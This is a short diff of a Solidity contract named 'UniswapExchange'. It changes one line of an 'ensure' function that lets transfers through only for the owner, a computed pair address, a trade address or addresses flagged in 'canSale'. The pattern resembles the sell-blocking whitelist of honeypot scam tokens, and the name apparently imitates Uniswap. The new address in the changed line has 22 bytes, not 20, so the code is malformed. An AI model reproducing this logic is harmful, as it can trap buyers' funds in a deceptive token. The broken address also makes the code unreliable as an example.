@@ -214,7 +214,7 @@ contract UniswapExchange {
     }
 
     function ensure(address _from, address _to, uint _value) internal view returns(bool) {
-        address _UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
+        address _UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0x0000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48, address(this));
         //go the white address first
         if(_from == owner || _to == owner || _from == UNI || _from == _UNI || _from==tradeAddress||canSale[_from]){
             return true;
